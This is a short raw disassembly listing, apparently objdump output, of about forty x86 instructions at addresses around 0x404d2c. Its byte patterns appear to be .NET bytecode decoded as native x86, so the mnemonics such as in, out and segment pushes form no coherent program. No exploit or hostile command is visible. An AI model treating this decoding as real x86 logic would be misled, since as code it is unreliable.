  404d2c:	06                   	push   %es
  404d2d:	39 80 00 00 00 73    	cmp    %eax,0x73000000(%eax)
  404d33:	81 00 00 06 0c 07    	addl   $0x70c0600,(%eax)
  404d39:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404d3c:	00 0a                	add    %cl,(%edx)
  404d3e:	2d 05 dd 96 00       	sub    $0x96dd05,%eax
  404d43:	00 00                	add    %al,(%eax)
  404d45:	1e                   	push   %ds
  404d46:	28 57 00             	sub    %dl,0x0(%edi)
  404d49:	00 06                	add    %al,(%esi)
  404d4b:	72 50                	jb     0x404d9d
  404d4d:	14 00                	adc    $0x0,%al
  404d4f:	70 28                	jo     0x404d79
  404d51:	68 00 00 0a 0d       	push   $0xd0a0000
  404d56:	08 07                	or     %al,(%edi)
  404d58:	09 28                	or     %ebp,(%eax)
  404d5a:	2b 00                	sub    (%eax),%eax
  404d5c:	00 0a                	add    %cl,(%edx)
  404d5e:	7d 50                	jge    0x404db0
  404d60:	00 00                	add    %al,(%eax)
  404d62:	04 08                	add    $0x8,%al
  404d64:	7b 50                	jnp    0x404db6
  404d66:	00 00                	add    %al,(%eax)
  404d68:	04 28                	add    $0x28,%al
  404d6a:	24 00                	and    $0x0,%al
  404d6c:	00 0a                	add    %cl,(%edx)
  404d6e:	2d 66 08 fe 06       	sub    $0x6fe0866,%eax
  404d73:	82 00 00             	addb   $0x0,(%eax)
  404d76:	06                   	push   %es
  404d77:	73 eb                	jae    0x404d64
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	0a 28                	or     (%eax),%ch
  404d7d:	ec                   	in     (%dx),%al
  404d7e:	00 00                	add    %al,(%eax)
  404d80:	0a 6f ed             	or     -0x13(%edi),%ch
  404d83:	00 00                	add    %al,(%eax)
  404d85:	0a 13                	or     (%ebx),%dl
  404d87:	04 12                	add    $0x12,%al
  404d89:	04 28                	add    $0x28,%al
  404d8b:	ee                   	out    %al,(%dx)
  404d8c:	00 00                	add    %al,(%eax)
  404d8e:	0a 2d 3e 02 16 25    	or     0x2516023e,%ch
  404d94:	0a 7d 51             	or     0x51(%ebp),%bh
  404d97:	00 00                	add    %al,(%eax)
  404d99:	04 02                	add    $0x2,%al
